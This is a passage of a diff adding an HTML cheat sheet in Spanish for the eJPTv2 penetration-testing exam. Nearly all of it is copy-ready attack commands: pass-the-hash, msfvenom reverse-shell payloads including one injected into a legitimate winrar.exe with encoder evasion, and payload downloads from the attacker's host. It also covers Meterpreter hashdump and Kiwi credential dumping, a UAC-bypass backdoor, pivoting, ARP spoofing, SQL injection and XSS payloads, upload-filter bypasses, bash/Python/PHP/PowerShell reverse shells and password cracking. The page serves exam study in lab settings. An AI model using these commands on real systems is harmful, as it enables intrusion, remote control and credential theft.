+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--orange)">🐧 psexec (Pass-the-Hash / credenciales)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Con credenciales válidas de SMB</span>
+<span class="cmd">psexec.py</span> <span class="val">&lt;DOMAIN/USER&gt;</span>:<span class="val">&lt;PASS&gt;</span>@<span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">psexec.py Administrator:</span><span class="val">'P@ssw0rd'</span>@<span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># MSF psexec</span>
+use exploit/windows/smb/psexec
+set SMBUser <span class="val">Administrator</span>
+set SMBPass <span class="val">'P@ssw0rd'</span>
+set RHOSTS <span class="val">&lt;TARGET_IP&gt;</span>
+exploit
+
+<span class="comment"># Pass-the-Hash</span>
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass <span class="val">&lt;NTLM_HASH&gt;</span>   <span class="comment"># aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;</span>
+set target Native\ upload
+exploit
+
+<span class="comment"># CrackMapExec Pass-the-Hash</span>
+<span class="cmd">crackmapexec smb</span> <span class="val">&lt;TARGET_IP&gt;</span> -u Administrator \
+  -H <span class="val">"&lt;NTLM_HASH&gt;"</span> -x "whoami"</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- MSFVENOM -->
+<section id="msfvenom" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">💣</span>
+    <div>
+      <div class="phase-title" style="color:var(--red)">msfvenom — Generación de Payloads</div>
+      <div class="phase-subtitle">Staged (/) vs Non-Staged (_) — recuérdalo siempre</div>
+    </div>
+  </div>
+
+  <div class="tip"><strong>💡 Staged vs Non-Staged:</strong> <code>windows/meterpreter/reverse_tcp</code> = STAGED (/) — necesita multi/handler para enviar el stage. <code>windows/meterpreter_reverse_tcp</code> = NON-STAGED (_) — payload completo, se ejecuta solo. Para el eJPTv2 usa staged por defecto.</div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--red)">🪟 Windows Payloads</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Win 32bit .exe</span>
+<span class="cmd">msfvenom -a x86 -p windows/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f exe > payload_x86.exe
+
+<span class="comment"># Win 64bit .exe</span>
+<span class="cmd">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f exe > payload_x64.exe
+
+<span class="comment"># Win ASP (IIS/WebDAV)</span>
+<span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f asp > shell.asp
+
+<span class="comment"># Win ASPX (.NET)</span>
+<span class="cmd">msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">443</span> -f aspx > shell.aspx
+
+<span class="comment"># WAR (Tomcat)</span>
+<span class="cmd">msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f war > shell.war
+
+<span class="comment"># Con encoding (evasion básica)</span>
+<span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> \
+  -e x86/shikata_ga_nai -i 10 -f exe > payload_encoded.exe
+
+<span class="comment"># Inyectar en ejecutable legítimo</span>
+<span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> \
+  -e x86/shikata_ga_nai -i 10 \
+  -f exe -x winrar.exe > malicious_winrar.exe</code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--red)">🐧 Linux Payloads</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Linux 32bit ELF</span>
+<span class="cmd">msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f elf > payload_x86.elf
+
+<span class="comment"># Linux 64bit ELF</span>
+<span class="cmd">msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f elf > payload_x64.elf
+
+<span class="comment"># PHP (web shell)</span>
+<span class="cmd">msfvenom -p php/meterpreter_reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f raw > shell.php
+
+<span class="comment"># JSP (Java)</span>
+<span class="cmd">msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">4444</span> -f raw > shell.jsp
+
+<span class="comment">## LISTENER — siempre necesario para payloads staged</span>
+<span class="cmd">msfconsole</span>
+use exploit/multi/handler
+set payload <span class="val">windows/meterpreter/reverse_tcp</span>
+set LHOST <span class="val">&lt;YOUR_IP&gt;</span>
+set LPORT <span class="val">4444</span>
+<span class="comment"># Para múltiples sesiones:</span>
+set ExitOnSession false
+exploit -j
+
+<span class="comment">## Transferir payload al target</span>
+<span class="comment"># En tu máquina</span>
+<span class="cmd">python3 -m http.server 8000</span>
+
+<span class="comment"># En el target (Windows)</span>
+<span class="cmd">certutil -urlcache -split -f</span> \
+  http://<span class="val">&lt;YOUR_IP&gt;</span>:8000/payload.exe payload.exe
+
+<span class="comment"># En el target (Linux)</span>
+<span class="cmd">wget http://</span><span class="val">&lt;YOUR_IP&gt;</span>:8000/payload.elf
+<span class="cmd">curl -O http://</span><span class="val">&lt;YOUR_IP&gt;</span>:8000/payload.elf</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- METASPLOIT -->
+<section id="metasploit" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🐉</span>
+    <div>
+      <div class="phase-title" style="color:var(--purple)">Metasploit — Guía rápida</div>
+      <div class="phase-subtitle">MSF y Meterpreter son el corazón del eJPTv2</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--purple)">🐉 MSF Comandos esenciales</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Iniciar MSF</span>
+<span class="cmd">msfconsole -q</span>   <span class="comment"># -q silencia el banner</span>
+
+<span class="comment"># Comandos básicos</span>
+db_status
+search <span class="val">&lt;servicio/CVE&gt;</span>
+search cve:2017 type:exploit platform:windows
+use <span class="val">&lt;MODULE&gt;</span>
+info
+show options
+show advanced options
+show payloads
+set <span class="val">&lt;OPTION&gt;</span> <span class="val">&lt;VALUE&gt;</span>
+setg RHOSTS <span class="val">&lt;TARGET_IP&gt;</span>   <span class="comment"># setg = global (persiste)</span>
+run                         <span class="comment"># o exploit</span>
+back
+
+<span class="comment"># Workspaces</span>
+workspace
+workspace -a <span class="val">mi_target</span>
+workspace <span class="val">mi_target</span>
+workspace -d <span class="val">mi_target</span>
+
+<span class="comment"># Sesiones</span>
+sessions
+sessions -l
+sessions -i <span class="val">1</span>           <span class="comment"># interactuar con sesión 1</span>
+sessions -k <span class="val">1</span>           <span class="comment"># matar sesión 1</span>
+sessions -K              <span class="comment"># matar todas</span>
+sessions -u <span class="val">1</span>           <span class="comment"># upgrade shell → meterpreter</span>
+sessions -n <span class="val">nombre</span> -i <span class="val">1</span> <span class="comment"># renombrar sesión</span>
+sessions -C sysinfo -i <span class="val">1</span> <span class="comment"># ejecutar comando en sesión</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--purple)">🔮 Meterpreter — Comandos clave</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Info básica</span>
+sysinfo
+getuid
+getpid
+ps               <span class="comment"># procesos</span>
+ps -U SYSTEM
+ifconfig
+route
+
+<span class="comment"># Navegación</span>
+pwd
+ls
+cd <span class="val">&lt;dir&gt;</span>
+cat <span class="val">&lt;archivo&gt;</span>
+download <span class="val">&lt;archivo&gt;</span> /root/
+upload <span class="val">&lt;archivo&gt;</span> C:\\Windows\\Temp\\
+
+<span class="comment"># Shell</span>
+shell           <span class="comment"># abre cmd/bash</span>
+background      <span class="comment"># o Ctrl+Z</span>
+
+<span class="comment"># Privesc</span>
+getsystem                   <span class="comment"># intento automático</span>
+run post/windows/gather/win_privs
+
+<span class="comment"># Migration (importante!)</span>
+migrate <span class="val">&lt;PID&gt;</span>               <span class="comment"># migrar a otro proceso</span>
+run post/windows/manage/migrate <span class="comment"># automático</span>
+pgrep explorer
+pgrep lsass
+
+<span class="comment"># Shell to Meterpreter (si tienes shell básica)</span>
+background
+use post/multi/manage/shell_to_meterpreter
+set SESSION <span class="val">1</span>
+set LHOST <span class="val">&lt;YOUR_IP&gt;</span>
+run
+sessions <span class="val">2</span>
+
+<span class="comment"># Hashdump</span>
+hashdump
+use post/windows/gather/hashdump
+
+<span class="comment"># Mimikatz / Kiwi</span>
+load kiwi
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+sekurlsa_logonpasswords</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- POST EXPLOITATION -->
+<section id="postexploit" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🏴</span>
+    <div>
+      <div class="phase-title" style="color:var(--purple)">FASE 5 — POST-EXPLOITATION</div>
+      <div class="phase-subtitle">Ya estás dentro. Ahora estabiliza, enumera y domina.</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--purple)">🐧 Post-Expl Linux</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## ESTABILIZAR SHELL (CRÍTICO)</span>
+<span class="cmd">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="cmd">export TERM=xterm</span>
+<span class="comment"># Ctrl+Z</span>
+<span class="cmd">stty raw -echo; fg</span>
+
+<span class="comment">## ENUMERACIÓN BÁSICA</span>
+<span class="cmd">whoami && id</span>
+<span class="cmd">uname -a</span>
+<span class="cmd">cat /etc/os-release</span>
+<span class="cmd">hostname</span>
+<span class="cmd">cat /etc/passwd</span>
+<span class="cmd">cat /etc/shadow</span>     <span class="comment"># solo como root</span>
+<span class="cmd">ps aux</span>
+<span class="cmd">ss -tuln</span>            <span class="comment"># puertos escuchando</span>
+<span class="cmd">netstat -tunp</span>
+<span class="cmd">ip route</span>            <span class="comment"># ¿hay más redes?</span>
+
+<span class="comment">## BUSCAR FLAGS</span>
+<span class="cmd">find / -name "flag*" 2>/dev/null</span>
+<span class="cmd">find / -name "proof.txt" 2>/dev/null</span>
+<span class="cmd">find / -name "*.txt" 2>/dev/null | grep -v proc</span>
+
+<span class="comment">## LINPEAS (automatizado)</span>
+<span class="cmd">curl -L https://github.com/carlospolop/PEASS-ng/releases/\
+latest/download/linpeas.sh | sh</span>
+<span class="comment"># O transferirlo desde tu máquina</span>
+<span class="cmd">wget http://</span><span class="val">&lt;YOUR_IP&gt;</span>:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh</code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--purple)">🪟 Post-Expl Windows</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## INFO BÁSICA</span>
+<span class="cmd">whoami</span>
+<span class="cmd">systeminfo</span>
+<span class="cmd">net users</span>
+<span class="cmd">net localgroup administrators</span>
+<span class="cmd">ipconfig /all</span>
+<span class="cmd">route print</span>
+<span class="cmd">netstat -ano</span>
+
+<span class="comment">## BUSCAR ARCHIVOS</span>
+dir /b/s <span class="val">"*.txt"</span>
+dir /b/s <span class="val">"*.conf"</span>
+dir /b/s <span class="val">"*pass*"</span>
+dir /b/s <span class="val">"*flag*"</span>
+<span class="cmd">type</span>              <span class="comment"># equivalente a cat</span>
+<span class="cmd">cd</span>               <span class="comment"># equivalente a pwd</span>
+
+<span class="comment">## LISTAR DRIVES</span>
+<span class="cmd">wmic logicaldisk get Caption,Description,providername</span>
+<span class="cmd">fsutil fsinfo drives</span>
+
+<span class="comment">## WINPEAS</span>
+<span class="comment"># Subir desde Meterpreter:</span>
+upload /opt/winpeas.exe C:\\Temp\\winpeas.exe
+shell
+C:\Temp\winpeas.exe
+
+<span class="comment">## WINDOWS EXPLOIT SUGGESTER</span>
+<span class="comment"># 1. Obtener systeminfo</span>
+shell > systeminfo > sysinfo.txt
+<span class="comment"># 2. En tu máquina</span>
+./windows-exploit-suggester.py --update
+./windows-exploit-suggester.py --database <span class="val">mssb.xlsx</span> \
+  --systeminfo sysinfo.txt</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PRIVESC -->
+<section id="privesc" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">⬆️</span>
+    <div>
+      <div class="phase-title" style="color:var(--yellow)">Escalada de Privilegios</div>
+      <div class="phase-subtitle">El checklist que no puedes olvidar</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--yellow)">🐧 Linux PrivEsc Checklist</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## 1. sudo -l (¿qué puedo ejecutar como sudo?)</span>
+<span class="cmd">sudo -l</span>
+<span class="comment"># Si aparece (ALL) NOPASSWD → GTFOBins!</span>
+<span class="comment"># https://gtfobins.github.io/</span>
+
+<span class="comment">## 2. SUID Binaries</span>
+<span class="cmd">find / -perm -4000 2>/dev/null</span>
+<span class="cmd">find / -perm -u=s -type f 2>/dev/null</span>
+
+<span class="comment">## 3. Cron Jobs</span>
+<span class="cmd">cat /etc/crontab</span>
+<span class="cmd">crontab -l</span>
+<span class="cmd">ls -la /etc/cron*</span>
+<span class="cmd">cat /etc/cron.d/*</span>
+
+<span class="comment">## 4. Contraseñas en archivos de configuración</span>
+<span class="cmd">find / -name "*.conf" 2>/dev/null | xargs grep -l "password"</span>
+<span class="cmd">find / -name "wp-config.php" 2>/dev/null</span>
+<span class="cmd">cat /var/www/html/wp-config.php</span>
+
+<span class="comment">## 5. Kernel exploits</span>
+<span class="cmd">uname -a</span>
+<span class="comment"># Buscar: searchsploit "Linux Kernel &lt;versión&gt;"</span>
+<span class="comment"># MSF:</span>
+use post/multi/recon/local_exploit_suggester
+set SESSION <span class="val">1</span>
+run
+
+<span class="comment">## 6. Credenciales en historial</span>
+<span class="cmd">cat ~/.bash_history</span>
+<span class="cmd">cat ~/.zsh_history</span>
+<span class="cmd">env</span>
+
+<span class="comment">## 7. SSH Keys</span>
+<span class="cmd">find / -name "id_rsa" 2>/dev/null</span>
+<span class="cmd">find / -name "authorized_keys" 2>/dev/null</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--yellow)">🪟 Windows PrivEsc Checklist</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## 1. UAC Bypass (UACME)</span>
+<span class="comment"># Generar backdoor</span>
+<span class="cmd">msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=<span class="val">5555</span> -f exe > backdoor.exe
+
+<span class="comment"># En Meterpreter</span>
+upload backdoor.exe C:\\Temp\\backdoor.exe
+upload Akagi64.exe C:\\Temp\\Akagi64.exe
+shell
+Akagi64.exe 23 C:\Temp\backdoor.exe
+
+<span class="comment">## 2. Token Impersonation (Incognito)</span>
+<span class="comment"># En Meterpreter</span>
+pgrep explorer
+migrate <span class="val">&lt;PID&gt;</span>
+getprivs
+load incognito
+list_tokens -u
+impersonate_token <span class="val">"ATTACKDEFENSE\Administrator"</span>
+getuid
+<span class="comment"># Si access denied:</span>
+pgrep explorer
+migrate <span class="val">&lt;PID&gt;</span>
+getprivs
+
+<span class="comment">## 3. Kernel Exploit (Windows)</span>
+<span class="comment"># Obtener systeminfo → windows-exploit-suggester</span>
+shell
+systeminfo
+<span class="comment"># MSF sugeridor automático:</span>
+use post/multi/recon/local_exploit_suggester
+
+<span class="comment">## 4. Después de tener SYSTEM</span>
+ps -U SYSTEM
+migrate <span class="val">&lt;lsass_PID&gt;</span>
+hashdump
+<span class="comment"># o Kiwi:</span>
+load kiwi
+creds_all</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PIVOTING -->
+<section id="pivoting" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🔀</span>
+    <div>
+      <div class="phase-title" style="color:var(--cyan)">Pivoting — Llegar a redes ocultas</div>
+      <div class="phase-subtitle">Uno de los temas más importantes del eJPTv2</div>
+    </div>
+  </div>
+
+  <div class="warn-box"><strong>⚠️ Cuándo usarlo:</strong> Cuando estás dentro de una máquina y ves una segunda red en <code>ifconfig/ip a</code> (ej: el target tiene 10.10.10.5 y también 192.168.1.5 — la red 192.168.1.0/24 es tu nuevo objetivo).</div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--cyan)">🔀 Pivoting con Metasploit (Autoroute)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Dentro de Meterpreter — ver interfaces de red</span>
+ifconfig
+route
+
+<span class="comment"># Agregar ruta (autoroute)</span>
+<span class="cmd">run autoroute -s</span> <span class="val">192.168.1.0/24</span>
+<span class="cmd">run autoroute -p</span>          <span class="comment"># ver rutas activas</span>
+
+<span class="comment"># Desde msfconsole</span>
+background
+use post/multi/manage/autoroute
+set SESSION <span class="val">1</span>
+set SUBNET <span class="val">192.168.1.0</span>
+run
+
+<span class="comment"># Port forwarding (acceder a puerto remoto)</span>
+portfwd add -l <span class="val">3389</span> -p <span class="val">3389</span> -r <span class="val">192.168.1.5</span>
+<span class="comment"># Ahora conectas a localhost:3389 → 192.168.1.5:3389</span>
+portfwd list
+
+<span class="comment"># Socks proxy (para herramientas externas)</span>
+use auxiliary/server/socks_proxy
+set SRVPORT <span class="val">9050</span>
+set VERSION 5
+run -j
+
+<span class="comment"># Luego en proxychains.conf:</span>
+<span class="comment"># socks5 127.0.0.1 9050</span>
+<span class="cmd">proxychains nmap -sT -Pn -p 22,80,445</span> <span class="val">192.168.1.5</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--cyan)">🛣️ Rutas manuales (sin MSF)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Linux — agregar ruta manualmente</span>
+<span class="comment"># Sintaxis: ip route add &lt;RED&gt; via &lt;GATEWAY&gt; dev &lt;INTERFACE&gt;</span>
+<span class="cmd">ip route add</span> <span class="val">192.168.1.0/24</span> via <span class="val">10.10.10.1</span> dev tap0
+
+<span class="comment"># Ejemplo típico en eJPTv2:</span>
+<span class="cmd">ip route add</span> <span class="val">10.10.10.0/24</span> via <span class="val">10.10.11.1</span> dev tap0
+
+<span class="comment"># Verificar ruta agregada</span>
+<span class="cmd">ip route</span>
+<span class="cmd">route</span>
+
+<span class="comment"># Windows</span>
+<span class="cmd">route add</span> <span class="val">192.168.1.0</span> mask 255.255.255.0 <span class="val">10.10.10.1</span>
+
+<span class="comment">## ARP Spoofing (MitM)</span>
+<span class="cmd">echo 1 > /proc/sys/net/ipv4/ip_forward</span>
+<span class="cmd">arpspoof -i tap0 -t</span> <span class="val">&lt;VICTIM_IP&gt;</span> -r <span class="val">&lt;GATEWAY_IP&gt;</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- WEB ATTACKS -->
+<section id="web" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🌐</span>
+    <div>
+      <div class="phase-title" style="color:var(--green)">Web Application Attacks</div>
+      <div class="phase-subtitle">SQLi, XSS, File Upload, LFI — los más comunes en el examen</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--green)">💉 SQL Injection</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Pruebas manuales básicas en campos/URL</span>
+'
+''
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+admin'--
+" OR "1"="1
+
+<span class="comment">## SQLMap — automatizado</span>
+<span class="comment"># URL con parámetro GET</span>
+<span class="cmd">sqlmap -u "http://</span><span class="val">&lt;TARGET&gt;</span>/page?id=1" --dbs
+<span class="cmd">sqlmap -u "http://</span><span class="val">&lt;TARGET&gt;</span>/page?id=1" -p id --dbs
+
+<span class="comment"># Desde request capturado (Burp)</span>
+<span class="cmd">sqlmap -r login.req</span> --dbs
+
+<span class="comment"># POST data</span>
+<span class="cmd">sqlmap -u "http://</span><span class="val">&lt;TARGET&gt;</span>/login.php" \
+  --data="user=admin&password=admin" --dbs
+
+<span class="comment"># Obtener tablas de una DB</span>
+<span class="cmd">sqlmap -u "..." -D</span> <span class="val">&lt;database&gt;</span> --tables
+
+<span class="comment"># Dumpear tabla</span>
+<span class="cmd">sqlmap -u "..." -D</span> <span class="val">&lt;database&gt;</span> -T <span class="val">&lt;table&gt;</span> --dump
+
+<span class="comment"># Shell via SQLMap (si tiene permisos)</span>
+<span class="cmd">sqlmap -u "..." --os-shell</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--green)">📎 File Upload Bypass</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## Técnicas de bypass de upload</span>
+<span class="comment"># 1. Cambiar extensión</span>
+shell.php → shell.php5
+shell.php → shell.phtml
+shell.php → shell.pHp
+shell.php → shell.php.jpg
+
+<span class="comment"># 2. Cambiar Content-Type en Burp</span>
+Content-Type: image/jpeg   <span class="comment"># aunque sea PHP</span>
+
+<span class="comment"># 3. Double extension</span>
+shell.jpg.php
+shell.php.jpg       <span class="comment"># a veces solo valida última</span>
+
+<span class="comment"># 4. Null byte (versiones antiguas)</span>
+shell.php%00.jpg
+
+<span class="comment">## HTTP PUT para subir shell (WebDAV)</span>
+<span class="comment"># Calcular tamaño del archivo</span>
+<span class="cmd">wc -m shell.php</span>
+
+<span class="comment"># PUT via netcat</span>
+<span class="cmd">nc</span> <span class="val">&lt;TARGET_IP&gt;</span> 80
+PUT /shell.php HTTP/1.0
+Content-Type: text/html
+Content-Length: <span class="val">&lt;SIZE&gt;</span>
+
+<span class="comment"># Webshells disponibles en Kali</span>
+ls /usr/share/webshells/
+ls /usr/share/webshells/php/
+ls /usr/share/webshells/asp/</code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--green)">🔍 XSS básico</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## Payloads XSS básicos</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+<span class="comment">## Recursos</span>
+<span class="comment"># OWASP XSS Filter Evasion:</span>
+<span class="comment"># https://owasp.org/www-community/xss-filter-evasion-cheatsheet</span>
+
+<span class="comment">## Herramientas útiles web</span>
+<span class="comment"># Reverse Shell Generator online:</span>
+<span class="comment"># https://www.revshells.com/</span>
+
+<span class="comment"># CyberChef (encode/decode):</span>
+<span class="comment"># https://gchq.github.io/CyberChef/</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--green)">🔗 Reverse Shells manuales</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## Escuchar con netcat</span>
+<span class="cmd">nc -nvlp 4444</span>
+
+<span class="comment">## Payloads reverse shell</span>
+<span class="comment"># Bash</span>
+bash -i >& /dev/tcp/<span class="val">&lt;YOUR_IP&gt;</span>/<span class="val">4444</span> 0>&1
+
+<span class="comment"># Python</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="val">&lt;IP&gt;</span>",<span class="val">4444</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+<span class="comment"># PHP</span>
+php -r '$sock=fsockopen("<span class="val">&lt;IP&gt;</span>",<span class="val">4444</span>);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'
+
+<span class="comment"># Netcat</span>
+nc -e /bin/bash <span class="val">&lt;YOUR_IP&gt;</span> <span class="val">4444</span>
+
+<span class="comment"># PowerShell (Windows)</span>
+powershell -NoP -NonI -W Hidden -Exec Bypass \
+  -Command New-Object System.Net.Sockets.TCPClient("<span class="val">&lt;IP&gt;</span>",<span class="val">4444</span>)</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CREDENCIALES -->
+<section id="credenciales" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🔑</span>
+    <div>
+      <div class="phase-title" style="color:var(--blue)">Credenciales — Brute Force & Cracking</div>
+      <div class="phase-subtitle">Hydra, John, Hashcat — las herramientas del eJPTv2</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--blue)">🔨 Hydra — Brute Force</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># SSH</span>
+<span class="cmd">hydra -l</span> admin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt \
+  ssh://<span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">hydra -L</span> users.txt <span class="flag">-P</span> passwords.txt \
+  <span class="flag">-t 4 -v -V -u</span> <span class="val">&lt;TARGET_IP&gt;</span> ssh
+
+<span class="comment"># FTP</span>
+<span class="cmd">hydra -l</span> admin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt \
+  ftp://<span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># HTTP POST Form</span>
+<span class="cmd">hydra</span> <span class="val">&lt;TARGET_IP&gt;</span> http-post-form \
+  "/login.php:user=^USER^&password=^PASS^:Invalid" \
+  <span class="flag">-L</span> usernames.txt <span class="flag">-P</span> passwords.txt <span class="flag">-f -V</span>
+
+<span class="comment"># HTTP GET (Basic Auth)</span>
+<span class="cmd">hydra -L</span> users.txt <span class="flag">-P</span> passwords.txt \
+  <span class="val">&lt;TARGET_IP&gt;</span> http-get /webdav/
+
+<span class="comment"># SMB</span>
+<span class="cmd">hydra -L</span> users.txt <span class="flag">-P</span> passwords.txt \
+  smb://<span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># MySQL</span>
+<span class="cmd">hydra -l root -P</span> /usr/share/wordlists/rockyou.txt \
+  <span class="val">&lt;TARGET_IP&gt;</span> mysql
+
+<span class="comment"># Flags útiles:</span>
+<span class="comment"># -f = parar al primer éxito</span>
+<span class="comment"># -V = verbose por intento</span>
+<span class="comment"># -t 4 = 4 threads (SSH se pone nervioso con más)</span>
+<span class="comment"># -U ftp = info sobre módulo ftp</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--blue)">🔓 John the Ripper & Hashcat</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## John the Ripper</span>
+<span class="comment"># Crackear /etc/shadow</span>
+<span class="cmd">unshadow</span> /etc/passwd /etc/shadow > unshadowed.txt
+<span class="cmd">john --wordlist=</span>/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+<span class="comment"># Con formato específico</span>
+<span class="cmd">john --wordlist=</span>/usr/share/wordlists/rockyou.txt \
+  --format=raw-md5 hash.txt
+
+<span class="comment"># Ver resultados</span>
+<span class="cmd">john --show</span> hash.txt
+
+<span class="comment"># Listar formatos soportados</span>
+<span class="cmd">john --list=formats</span>
+
+<span class="comment"># Con reglas (mangling)</span>
+<span class="cmd">john --wordlist=</span>/usr/share/wordlists/rockyou.txt \
+  --rules hash.txt
+
+<span class="comment">## Hashcat</span>
+<span class="cmd">hashcat -m 0</span> hash.txt /usr/share/wordlists/rockyou.txt  <span class="comment"># MD5</span>
+<span class="cmd">hashcat -m 1000</span> hash.txt /usr/share/wordlists/rockyou.txt <span class="comment"># NTLM</span>
+<span class="cmd">hashcat -m 1800</span> hash.txt /usr/share/wordlists/rockyou.txt <span class="comment"># sha512crypt</span>
+
+<span class="comment">## Identificar tipo de hash</span>
+<span class="cmd">hash-identifier</span>
+<span class="cmd">hashid</span> <span class="val">&lt;HASH&gt;</span>
+<span class="comment"># Online: https://crackstation.net</span></code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- Wordlists reference -->
+  <div class="card-full" style="margin-top:16px;">
+    <div class="card-header">📖 Wordlists — Ubicaciones en Kali</div>
+    <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code>/usr/share/wordlists/rockyou.txt                         <span class="comment"># THE WORDLIST para passwords</span>
